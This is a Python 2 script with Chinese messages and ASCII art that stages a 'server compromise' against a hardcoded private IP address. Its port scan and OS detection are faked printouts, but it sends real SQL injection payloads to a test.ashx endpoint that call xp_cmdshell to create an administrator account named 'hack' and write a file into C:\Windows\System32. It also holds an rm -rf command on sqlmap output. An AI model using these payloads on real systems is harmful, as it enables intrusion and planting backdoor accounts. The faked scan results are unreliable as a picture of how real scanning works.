# -*- coding: utf-8 -*-
import urllib2
import urllib
import time
import sys
import re
import random
import os
from colorama import Fore,Back,Style,init
global is_attack
def first_output():

    print "             ,        ,"
    print "            /(        )`"
    print "            \ \___   / |"
    print "            /- _  `-/  '"
    print "           (/\/ \ \   /\\"
    print "           / /   | `    \\"
    print "           O O   ) /    |"
    print "           `-^--'`<     '"
    print "          (_.)  _  )   /"
    print "           `.___/`    /"
    print "             `-----' /"
    print "<----.     __ / __   \\"
    print "<----|====O)))==) \) /===="
    print "<----'    `--' `.__,' \\"
    print "             |        |"
    print "              \       /"
    print "        ______( (_  / \______"
    print "      ,'  ,-----'   |        \\"
    print "      `--{__________)        \/"
def end_succes():
    print "                  *** ###  ### ***"
    print "              *##                  ##*"
    print "          *##                          ##*"
    print "       *##                                ##*"
    print "     *##                                    ##*"
    print "   *##          **                **          ##*"
    print "  *##          *@@*              *@@*          ##*"
    print "  *##          *@@*              *@@*          ##*"
    print " *##            **                **            ##*"
    print "*##                                              ##*"
    print "*##                      ___                     ##*"
    print "*##                     |BY:|                    ##*"
    print "*##        s            |CCW|           s        ##*"
    print "*##         s            ---           s         ##*"
    print " *##         s                        s         ##*"
    print "  *##         's                    s'         ##*"
    print "   *##          's                s'          ##*"
    print "     *##          's            s'          ##*"
    print "       *##           ~ |~v~v~v|~         ##*"
    print "          *##          |      |        ##*"
    print "              *##      |   |  |     ##*"
    print "                  ***  |   |  | ***"
    print "                       |   |  |"
    print "                       |   |  |"
    print "                       |   |  |"
    print "                       |      |"
    print "                       |  /\  |"
    print "                       |/    \|"

def end_fail():
    print "                       __---__"
    print "                    _-       /--______"
    print "               __--( /     \ )XXXXXXXXXXX\v."
    print "             .-XXX(   O   O  )XXXXXXXXXXXXXXX-"
    print "            /XXX(       U     )        XXXXXXX\\"
    print "         /XXXXX(              )--_  XXXXXXXXXXX\\"
    print "         /XXXXX/ (      O     )   XXXXXX   \XXXXX\\"
    print "         XXXXX/   /            XXXXXX   \__ \XXXXX"
    print "         XXXXXX__/          XXXXXX         \__---->"
    print " ---___  XXX__/          XXXXXX      \__         /"
    print "   \-  --__/   ___/\  XXXXXX            /  ___--/="
    print "    \-\    ___/    XXXXXX              '--- XXXXXX"
    print "       \-\/XXX\ XXXXXX                      /XXXXX"
    print "         \XXXXXXXXX   \                    /XXXXX/"
    print "          \XXXXXX      >                 _/XXXXX/"
    print "            \XXXXX--__/              __-- XXXX/"
    print "             -XXXXXXXX---------------  XXXXXX-"
    print "               \XXXXXXXXXXXXXXXXXXXXXXXXXX/"
    print "                  ""VXXXXXXXXXXXXXXXXXXV"""


def crawl(host):
    try:
        website="http://"+host+"/"
        openwebsite = urllib2.urlopen(website)
        htmlSource = openwebsite.read()
        #print htmlSource
        linksList = re.findall('<a href=(.*?)>.*?</a>', htmlSource)
        for link in linksList:
            print "http://"+host+link[1:-1]+"?id=or 1=1 --"
            time.sleep(0.5)
        print "test.ashx?id=or 1=1"
    except:
        print '\033[1;31;40m'
        print "目标连接失败，尝试用暴力方式进行攻击"
        print '\033[0m'
def del_file(host):
    print "开始尝试替换用户桌面"
    time.sleep(3)
    try:
        del_data="1; exec ..xp_cmdshell 'echo 1 > c:\Windows\System32\lala.txt'"
        full_url="http://"+host+"/test.ashx?id="+urllib.quote(del_data)
        #print full_url
        html=urllib2.urlopen(full_url)
        print html.read()
        time.sleep(3)
        print "" + Fore.GREEN + Style.BRIGHT+"替换用户桌面成功"
    except:
        print "" + Fore.RED + Style.BRIGHT+"替换用户桌面失败"

def is_safe(host):
    print "开始检测目标ip："+host;
    for i in range(0,3):
        sys.stdout.write(".")
        sys.stdout.flush()
        time.sleep(2)
    print ""
def scan_port_os(host):
    ay=[]
    for randomi in xrange(0,200):
        ay.append(random.randint(10,10000))
    ay.append(80)
    ay.append(1433)
    ay.append(3389)
    ay.sort()
    news_ay = []
    for id in ay:
        if id not in news_ay:
            news_ay.append(id)
    for i in news_ay:
        if(i==80 or i==3389 or i==1433):
            print '\033[1;31;42m'
            print "检测到" + str(i) + "开放"
            print '\033[0m'
            time.sleep(1)
        print "检测端口"+str(i)+"是否开放"
        time.sleep(0.1)
    print "" + Fore.GREEN + Style.BRIGHT +"port        status        service"
    print "" + Fore.BLUE+   Style.BRIGHT +"80            open        http"
    print "" + Fore.BLUE + Style.BRIGHT + "139           open        microsoft-ds"
    print "" + Fore.BLUE + Style.BRIGHT + "445           open        microsoft-ds"
    print "" + Fore.BLUE + Style.BRIGHT + "1433          open        mssql"
    print "" + Fore.BLUE + Style.BRIGHT + "3389          open        rdp"
    print ""+Fore.RESET+Style.RESET_ALL
    print "检测操作系统："
    print "是否为unix"
    time.sleep(2)
    print "是否为linux"
    time.sleep(2)
    print "是否为windows"
    time.sleep(2)
    print "检测系统成功，系统为:windows"
    print "检测漏洞"
    crawl(host)
    print "发现有sql注入漏洞，开始攻击"
    time.sleep(5)
    cool_show()

def cool_show():
    f = open("/bin/bash", 'rb')
    f.seek(0, 0)
    index = 0
    while True:
        temp = f.read(1)
        if len(temp) == 0:
            break
        else:
            print "%3s" % temp.encode('hex'),
            #index = index + 1
        if index == 16:
            index = 0
            print
        #time.sleep(0.1)
    f.close()

def attack(ipaddr,i):
    if(i==0):
        is_attack=0
        return
    url_host="http://"+ipaddr+"/test.ashx?id=1"
    raw_data=" ;exec ..xp_cmdshell 'net user hack Admin123 /add && net localgroup administrators hack /add'"
    urldata=urllib.quote(raw_data)
    #print url_host+urldata
    try:
        res=urllib2.urlopen(url_host+urldata)
        print res.read()
        print "尝试添加用户hack"
        print '\033[1;31;42m'
        time.sleep(1)
        print "攻击成功"
        print '\033[0m'
    except:
        print '\033[1;31;40m'
        print "攻击失败,尝试重新攻击"
        print '\033[0m'
        time.sleep(2)
        i=i-1
        attack(ipaddr,i)

def res_out():
    print "" + Fore.RED + Style.BRIGHT+Back.BLACK+"服务器被成功攻陷"
    print "" + Fore.RED + Style.BRIGHT + Back.BLACK + "服务器被成功攻陷"
if __name__ == '__main__':
    is_attack=0
    #ipaddr=sys.argv[1]
    ipaddr="10.21.140.75"

    first_output()
    is_safe(ipaddr)
    scan_port_os(ipaddr)
    attack(ipaddr,5)
    del_file(ipaddr)
    time.sleep(3)
    if(is_attack==1):
        os.system('sh ~/sqlmap')
        os.system('rm -rf ~/.sqlmap/output')
        res_out()
        end_fail()
    end_succes()
    print "" + Fore.RESET + Style.RESET_ALL
    print "\033[0m "
